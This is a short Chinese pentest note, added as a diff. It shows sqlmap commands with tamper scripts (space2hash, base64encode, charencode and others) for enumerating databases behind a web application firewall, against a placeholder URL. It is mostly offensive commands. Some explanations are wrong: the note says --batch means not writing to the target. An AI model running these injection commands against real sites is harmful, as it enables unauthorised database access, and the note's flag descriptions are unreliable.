@@ -1,0 +1,38 @@
+
+
+               			SQLMAP渗透笔记之绕过WAF防火墙
+
+                                          
+
+                                           作者：拿破飞机
+
+---------------------------------------------------------------------------------------------
+
+注：此方法适用于在注入的时候出现频繁报错时或者可以确定网站有注入点的时候。
+
+
+batch：要求不对目标写入
+tamper：使用干预脚本
+
+-v 3(3为等级)
+
+注意：若不使用3等级无法继续下一步操作。
+
+常用脚本：space2morehash.py		space2hash.py		base64encode.py		charencode.py
+
+
+获取当前数据库，使用脚本绕过WAF防火墙
+sqlmap.py -u "http://www.xx.com/a.asp?id=123" -v 3 --dbs  --batch --tamper "脚本"
+
+
+示例1：
+sqlmap.py -u "http://www.xx.com/a.asp?id=123" -v 3 --dbs  --batch --tamper "space2morehash.py"
+
+示例2：
+sqlmap.py -u "http://www.xx.com/a.asp?id=123" -v 3 --dbs  --batch --tamper "space2hash.py"
+
+示例3：
+sqlmap.py -u "http://www.xx.com/a.asp?id=123" -v 3 --dbs  --batch --tamper "base64encode.py"
+
+示例4：
+sqlmap.py -u "http://www.xx.com/a.asp?id=123" -v 3 --dbs  --batch --tamper "charencode.py"
